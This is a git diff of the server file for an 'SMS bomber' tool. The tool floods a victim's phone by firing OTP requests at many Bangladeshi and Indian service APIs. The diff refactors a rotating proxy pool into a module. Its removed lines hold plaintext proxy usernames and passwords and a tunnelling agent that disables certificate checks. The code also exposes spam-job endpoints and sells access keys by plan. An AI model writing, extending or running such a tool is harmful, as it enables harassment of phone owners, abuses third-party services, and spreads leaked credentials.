@@ -1,138 +1,19 @@
 // ============================================================
 // ULTIMATE SMS BOMBER V8.6 - api/index.js
-// BD pool inlined (V8.5 lists, verbatim) + Indian pool from ./indian.js
+// V8.5 BD lists inlined + proxy.js + Indian.js modules
 // DEVELOPER: TNEH GROUP
 // ============================================================
 
 const express = require('express');
 const axios = require('axios');
-const http = require('http');
-const https = require('https');
-const net = require('net');
 const cors = require('cors');
 const helmet = require('helmet');
 const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
-const EventEmitter = require('events');
 
-const { INDIAN_APIS } = require('./indian');
-
-// ============================================================
-// PROXY POOL — WEBSHARE
-// ============================================================
-const RAW_PROXIES = [
-  '45.38.107.97:6014:rzghlmjq:cdujuj74ccnx',
-  '64.137.96.74:6641:rzghlmjq:cdujuj74ccnx',
-  '198.23.243.226:6361:rzghlmjq:cdujuj74ccnx',
-  '38.154.185.97:6370:rzghlmjq:cdujuj74ccnx',
-  '84.247.60.125:6095:rzghlmjq:cdujuj74ccnx',
-  '191.96.254.138:6185:rzghlmjq:cdujuj74ccnx',
-  '198.46.161.42:5092:rzghlmjq:cdujuj74ccnx',
-  '64.137.10.153:5803:rzghlmjq:cdujuj74ccnx',
-  '104.164.49.38:7693:rzghlmjq:cdujuj74ccnx',
-  '23.26.71.145:5628:rzghlmjq:cdujuj74ccnx'
-];
-
-class ProxyPool {
-  constructor(raw) {
-    this.proxies = raw.map((line, idx) => {
-      const [host, port, username, password] = line.split(':');
-      return { id: idx, host, port: parseInt(port, 10), username, password,
-        auth: Buffer.from(`${username}:${password}`).toString('base64'),
-        failures: 0, success: 0, disabled: false, lastError: null, lastUsed: null };
-    });
-    this.cursor = 0; this.maxFailures = 5;
-  }
-  next() {
-    const live = this.proxies.filter(p => !p.disabled);
-    if (!live.length) return null;
-    const p = live[this.cursor % live.length];
-    this.cursor = (this.cursor + 1) % Math.max(1, live.length);
-    p.lastUsed = Date.now(); return p;
-  }
-  report(p, ok, err = null) {
-    if (!p) return;
-    if (ok) { p.success++; p.failures = 0; }
-    else { p.failures++; p.lastError = err ? String(err).slice(0, 120) : 'error';
-      if (p.failures >= this.maxFailures) p.disabled = true; }
-  }
-  snapshot() { return this.proxies.map(p => ({ id: p.id, host: p.host, port: p.port,
-    success: p.success, failures: p.failures, disabled: p.disabled,
-    lastError: p.lastError, lastUsed: p.lastUsed })); }
-  stats() {
-    const live = this.proxies.filter(p => !p.disabled).length;
-    return { total: this.proxies.length, live, dead: this.proxies.length - live,
-      ok_calls: this.proxies.reduce((s, p) => s + p.success, 0),
-      failed_calls: this.proxies.reduce((s, p) => s + p.failures, 0) };
-  }
-}
-const proxyPool = new ProxyPool(RAW_PROXIES);
-
-function tunnelAgent(proxy) {
-  return new https.Agent({ keepAlive: true, maxSockets: 256, maxFreeSockets: 128,
-    timeout: 15000, scheduling: 'fifo', rejectUnauthorized: false,
-    createConnection: (opts, cb) => {
-      const host = opts.host, port = opts.port || 443;
-      const sock = net.connect(proxy.port, proxy.host);
-      let connected = false;
-      sock.once('connect', () => {
-        connected = true;
-        sock.write(`CONNECT ${host}:${port} HTTP/1.1\r\nHost: ${host}:${port}\r\nProxy-Authorization: Basic ${proxy.auth}\r\n\r\n`);
-      });
-      let buf = '';
-      const onData = (chunk) => {
-        buf += chunk.toString('latin1');
-        const idx = buf.indexOf('\r\n\r\n'); if (idx < 0) return;
-        sock.removeListener('data', onData);
-        const head = buf.slice(0, idx), rest = buf.slice(idx + 4);
-        const status = parseInt(head.split(' ')[1], 10);
-        if (status !== 200) { sock.destroy(); return cb(new Error(`proxy CONNECT ${status}`)); }
-        if (rest) sock.unshift(Buffer.from(rest, 'latin1'));
-        const tls = require('tls');
-        const secure = tls.connect({ socket: sock, servername: host, rejectUnauthorized: false });
-        secure.once('secureConnect', () => cb(null, secure));
-        secure.once('error', (e) => cb(e));
-      };
-      sock.on('data', onData);
-      sock.once('error', (e) => { if (!connected) cb(e); });
-    } });
-}
-function plainProxyAgent(proxy) {
-  return new http.Agent({ keepAlive: true, maxSockets: 256, maxFreeSockets: 128, timeout: 15000, scheduling: 'fifo',
-    createConnection: (opts, cb) => {
-      const host = opts.host, port = opts.port || 80;
-      const sock = net.connect(proxy.port, proxy.host);
-      sock.once('connect', () => {
-        sock.write(`CONNECT ${host}:${port} HTTP/1.1\r\nHost: ${host}:${port}\r\nProxy-Authorization: Basic ${proxy.auth}\r\n\r\n`);
-      });
-      let buf = '';
-      const onData = (chunk) => {
-        buf += chunk.toString('latin1');
-        const idx = buf.indexOf('\r\n\r\n'); if (idx < 0) return;
-        sock.removeListener('data', onData);
-        const rest = buf.slice(idx + 4);
-        const status = parseInt(buf.slice(0, idx).split(' ')[1], 10);
-        if (status !== 200) { sock.destroy(); return cb(new Error(`proxy CONNECT ${status}`)); }
-        if (rest) sock.unshift(Buffer.from(rest, 'latin1'));
-        cb(null, sock);
-      };
-      sock.on('data', onData);
-      sock.once('error', (e) => cb(e));
-    } });
-}
-const DIRECT_HTTPS = new https.Agent({ keepAlive: true, maxSockets: 2048, maxFreeSockets: 512, timeout: 12000, rejectUnauthorized: false });
-const DIRECT_HTTP  = new http.Agent({ keepAlive: true, maxSockets: 2048, maxFreeSockets: 512, timeout: 12000 });
-function agentsFor(url) {
-  const isHttps = url.startsWith('https://');
-  const p = proxyPool.next();
-  if (!p) return { httpsAgent: isHttps ? DIRECT_HTTPS : undefined, httpAgent: !isHttps ? DIRECT_HTTP : undefined, proxy: null };
-  return {
-    httpsAgent: isHttps ? tunnelAgent(p) : undefined,
-    httpAgent: !isHttps ? plainProxyAgent(p) : undefined,
-    proxy: p
-  };
-}
+const { proxyPool, agentsFor } = require('./proxy');
+const { INDIAN_APIS } = require('./Indian');
 
 // ============================================================
 // CONFIG
@@ -155,6 +36,9 @@ const ERROR_MESSAGES = {
   INTERNAL_ERROR: 'Internal server error'
 };
 
+// ============================================================
+// UTILITY
+// ============================================================
 class Utility {
   static generateId() { return crypto.randomBytes(16).toString('hex'); }
   static generateJobId() { return `JOB_${Date.now().toString(36).toUpperCase()}_${crypto.randomBytes(4).toString('hex').toUpperCase()}`; }
@@ -171,16 +55,8 @@ class Utility {
     if (raw.length === 10) return raw;
     return raw;
   }
-  static formatBytes(b) {
-    if (b === 0) return '0 B';
-    const k = 1024, sizes = ['B','KB','MB','GB'];
-    const i = Math.floor(Math.log(b) / Math.log(k));
-    return (b / Math.pow(k, i)).toFixed(2) + ' ' + sizes[i];
-  }
-  static getMemoryUsage() {
-    const u = process.memoryUsage();
-    return { rss: this.formatBytes(u.rss), heapUsed: this.formatBytes(u.heapUsed) };
-  }
+  static formatBytes(b) { if (b === 0) return '0 B'; const k=1024, sizes=['B','KB','MB','GB']; const i=Math.floor(Math.log(b)/Math.log(k)); return (b/Math.pow(k,i)).toFixed(2)+' '+sizes[i]; }
+  static getMemoryUsage() { const u=process.memoryUsage(); return { rss:this.formatBytes(u.rss), heapUsed:this.formatBytes(u.heapUsed) }; }
 }
 
 const USER_AGENTS = [
@@ -198,7 +74,7 @@ function getRandomHeaders(extra = {}) {
 }
 
 // ============================================================
-// BD POOL — V8.5 lists verbatim
+// BD POOL — V8.5 LISTS (PHP, V7.1, ORIGINAL, GX, LMNx9, MEGA)
 // ============================================================
 const MEGA_APIS = [
   { id: 1001, name: "QuizGiri (JSON)", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp?phone={phone}&country_code=+880&fcm_token=null", headers: { "content-type": "application/json" } },
@@ -602,7 +478,7 @@ for (let i = 1; i <= 50; i++) {
 }
 
 function dedupeApis(list) {
-  const seen = new Set(); const out = [];
+  const seen = new Set(), out = [];
   for (const api of list) {
     const key = `${api.method}::${api.url}`;
     if (seen.has(key)) continue;
@@ -619,10 +495,10 @@ console.log(`🇮🇳 IN APIs: ${INDIAN_APIS.length}`);
 console.log(`🌐 Proxies: ${proxyPool.proxies.length}`);
 
 // ============================================================
-// JOB STORE (BD + IN tagged)
+// JOB STORE
 // ============================================================
-class JobStore extends EventEmitter {
-  constructor() { super(); this.active = new Map(); this.completed = new Map();
+class JobStore {
+  constructor() { this.active = new Map(); this.completed = new Map();
     this.stats = { totalJobs: 0, totalSuccess: 0, totalFailed: 0, startTime: Date.now() }; }
   create({ phone, region, total, opts = {} }) {
     const id = Utility.generateJobId();
@@ -766,7 +642,7 @@ async function blast(apis, phone, count, jobId, region) {
   const t0 = Date.now();
   await Promise.allSettled(tasks);
   const elapsed = Date.now() - t0;
-  console.log(`💥 ${region} job ${jobId}: ${tasks.length} calls in ${elapsed}ms (${(tasks.length / (elapsed / 1000)).toFixed(1)} req/s)`);
+  console.log(`💥 ${region} job ${jobId}: ${tasks.length} calls in ${elapsed}ms`);
   return { fired: tasks.length, elapsed };
 }
 
@@ -793,8 +669,7 @@ app.get('/', (req, res) => {
 });
 
 app.get('/api', (req, res) => {
-  res.json({
-    developer: DEVELOPER_INFO, version: "8.6.0-INDIA",
+  res.json({ developer: DEVELOPER_INFO, version: "8.6.0-INDIA",
     bd_apis: BD_APIS.length, india_apis: INDIAN_APIS.length,
     endpoints: {
       spam: '/api/spam?number=01700000000&count=1',
@@ -802,10 +677,8 @@ app.get('/api', (req, res) => {
       indiaStop: '/api/India?stop&jobid=JOB_…   (or stop=all)',
       check: '/api/check?phone=01700000000',
       proxies: '/api/proxies',
-      status: '/api/status', stats: '/api/stats',
-      health: '/api/health'
-    }
-  });
+      status: '/api/status', stats: '/api/stats', health: '/api/health'
+    } });
 });
 
 app.get('/api/health', (req, res) => {
@@ -819,7 +692,6 @@ app.get('/api/proxies', (req, res) => {
   res.json({ success: true, developer: DEVELOPER_INFO, stats: proxyPool.stats(), proxies: proxyPool.snapshot() });
 });
 
-// -------- BD START --------
 app.get('/api/spam', async (req, res) => {
   const { plan, number, count = 1, key } = req.query;
   let currentPlan = 'default', planConfig = PLAN_CONFIG.default;
@@ -844,7 +716,6 @@ app.get('/api/spam', async (req, res) => {
     status_endpoint: `/api/status?jobId=${jobId}`, timestamp: Utility.getISOString() });
 });
 
-// -------- INDIA START + STOP --------
 app.get('/api/India', async (req, res) => {
   if (req.query.stop !== undefined) {
     const jobid = req.query.jobid || req.query.jobId;
@@ -878,7 +749,6 @@ app.get('/api/India', async (req, res) => {
     status_endpoint: `/api/status?jobId=${jobId}`, timestamp: Utility.getISOString() });
 });
 
-// -------- STOP / STATUS / STATS --------
 app.get('/api/stop', (req, res) => {
   const { jobId, all, region } = req.query;
   if (all === 'true') return res.json({ success: true, developer: DEVELOPER_INFO, stopped_count: jobs.stopAll(region || null) });
@@ -912,7 +782,6 @@ app.get('/api/alllist', (req, res) => {
     timestamp: Utility.getISOString() });
 });
 
-// -------- CHECK (BD only) --------
 app.get('/api/check', async (req, res) => {
   const phone = Utility.parsePhone(req.query.phone || '01712345678') || '01712345678';
   if (!Utility.isValidBDPhone(phone)) return res.status(400).json({ success: false, error: ERROR_MESSAGES.INVALID_PHONE, developer: DEVELOPER_INFO });
@@ -940,7 +809,6 @@ app.get('/api/check', async (req, res) => {
   res.json({ success: true, developer: DEVELOPER_INFO, phone, total: results.length, live, reachable, dead, results });
 });
 
-// -------- KEY --------
 app.get('/api/expiredate=30&createkey', (req, res) => {
   const { plan = 'premium', days = 30 } = req.query;
   if (!PLAN_CONFIG[plan]) return res.status(400).json({ success: false, error: `Invalid plan`, available: Object.keys(PLAN_CONFIG), developer: DEVELOPER_INFO });
